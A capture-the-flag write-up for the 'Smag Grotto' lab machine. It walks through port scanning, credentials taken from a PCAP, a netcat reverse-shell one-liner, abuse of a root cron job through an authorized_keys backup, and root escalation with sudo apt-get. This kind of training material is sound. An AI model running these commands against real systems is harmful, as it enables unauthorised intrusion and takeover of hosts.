**Running rustscan**:
```
┌──(kali㉿DESKTOP-0CQIE5S)-[~]
└─$ rustscan -a 10.10.154.205 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports faster than you can say 'SYN ACK'

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 10140'.
Open 10.10.154.205:22
Open 10.10.154.205:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A" on ip 10.10.154.205
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-25 12:12 IST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:12
Completed NSE at 12:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:12
Completed NSE at 12:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:12
Completed NSE at 12:12, 0.00s elapsed
Initiating Ping Scan at 12:12
Scanning 10.10.154.205 [4 ports]
Completed Ping Scan at 12:12, 0.54s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:12
Completed Parallel DNS resolution of 1 host. at 12:12, 1.07s elapsed
DNS resolution of 1 IPs took 1.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 12:12
Scanning 10.10.154.205 [2 ports]
Discovered open port 80/tcp on 10.10.154.205
Discovered open port 22/tcp on 10.10.154.205
Completed SYN Stealth Scan at 12:12, 0.27s elapsed (2 total ports)
Initiating Service scan at 12:12
Scanning 2 services on 10.10.154.205
Completed Service scan at 12:13, 12.17s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.154.205
Retrying OS detection (try #2) against 10.10.154.205
Initiating Traceroute at 12:13
Completed Traceroute at 12:13, 3.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 12:13
Completed Parallel DNS resolution of 2 hosts. at 12:13, 2.08s elapsed
DNS resolution of 2 IPs took 2.08s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.154.205.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:13
Completed NSE at 12:13, 5.90s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:13
Completed NSE at 12:13, 0.82s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:13
Completed NSE at 12:13, 0.01s elapsed
Nmap scan report for 10.10.154.205
Host is up, received reset ttl 60 (0.22s latency).
Scanned at 2025-06-25 12:12:48 IST for 34s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDORe0Df8XvRlc3MvkqhpqAX5/sbUoEiIckKSVOLJVmWb9jOq2r0AfjaYAAZzgH9RThlwbzjGj6r4yBsXrMFB01qemsYBzUkut9Q12P+uly9+SeL6X7CUavLnkcAz0bzkqQpIFLG9HUyu9ysmZqE1Xo6NumtNh3Bf4H1BbS+cRntagn1TreTWJUiT+s7Gr9KEIH7rQUM8jX/eD/zNTKMN9Ib6/TM7TkPxAnOSw5JRfTV/oC8fFGqvjcAMxlhqS44AL/ZziI50OrCX9rMKtjZuvPaW2U31Sr8nUmtd3jnJPjMH2ZRfeRTPybYOblPOZq5lV2Fu4TwF/xOv2OrACLDxj5
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN6hWP9VGah8N9DAM3Kb0OZlIEttMMjf+PXwLWfHf0dz6OtdbrEjblgrck0i7fT95F1qdRJHtBdEu5yg4r6/gkY=
|   256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWHQ800Vx/X5aGSIDdpkEuKgFDxnjak46F/IsegN2Ju
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Smag
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.4 (99%), Linux 3.8 - 3.16 (96%), Linux 3.2 - 4.14 (96%), Linux 5.4 (95%), Linux 3.10 - 3.13 (95%), Linux 3.13 (95%), Linux 2.6.32 - 3.10 (95%), Linux 3.10 - 4.11 (94%), Linux 3.13 - 4.4 (94%), Linux 4.15 (94%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=6/25%OT=22%CT=%CU=42246%PV=Y%DS=5%DC=T%G=N%TM=685B9A8A%P=x86_64-pc-linux-gnu)
SEQ(TI=Z%CI=RD%II=I%TS=8)
SEQ(SP=FE%GCD=1%ISR=104%TI=Z%CI=I%II=I%TS=8)
OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.000 days (since Wed Jun 25 12:12:52 2025)
Network Distance: 5 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   61.77 ms  10.17.0.1
2   ... 4
5   200.15 ms 10.10.154.205

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:13
Completed NSE at 12:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:13
Completed NSE at 12:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:13
Completed NSE at 12:13, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.91 seconds
           Raw packets sent: 80 (5.284KB) | Rcvd: 2660 (107.968KB)
```


Diectory bruteforcing leads us to http://10.10.154.205/mail/
We also have three users:
jake@smag.thm 
netadmin@smag.thm 
uzi@smag.thm
The site also gives us a PCAP file. 

![Pasted image 20250625122254.png](assets/smag-grotto/Pasted%20image%2020250625122254.png)

Analyzing the PCAP gives us **username and password** as well as **another endpoint** `development.smag.thm/login.php` which we add to our `/etc/hosts`

![Pasted image 20250625122737.png](assets/smag-grotto/Pasted%20image%2020250625122737.png)
 logging in with the creds from PCAP file:
 
 ![Pasted image 20250625122844.png](assets/smag-grotto/Pasted%20image%2020250625122844.png)
We try running the commands but do not see any output. We can try to get a reverse shell.

Using the payload for reverse shell: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.138.250 4444 >/tmp/f`

We get a reverse shell as www-data: 
Enumerating this further using linpeas/manual enumeration we get the following cronab entry:
```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
#
```

As per the last entry, in crontab file Every minute, the root user copies the contents of `/opt/.backups/jake_id_rsa.pub.backup` into `/home/jake/.ssh/authorized_keys`

Since we have write permissions to this file, we can leverage this by copying our own ssh public key and ssh as jake. 
Generating our own key using ssh-keygen: `ssh-keygen -t rsa -b 2048 -f /tmp/mykey:`
We can now obtain the user flag.
![Pasted image 20250625152145.png](assets/smag-grotto/Pasted%20image%2020250625152145.png)

running `sudo -l` gives us the following output: 
![Pasted image 20250625152546.png](assets/smag-grotto/Pasted%20image%2020250625152546.png)

this shows that jake can run `apt-get`.  Using [gtfobins](https://gtfobins.github.io/gtfobins/apt-get/) we can easily escalate out privileges to root
Using `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` we escalate to root and obtain the root flag.


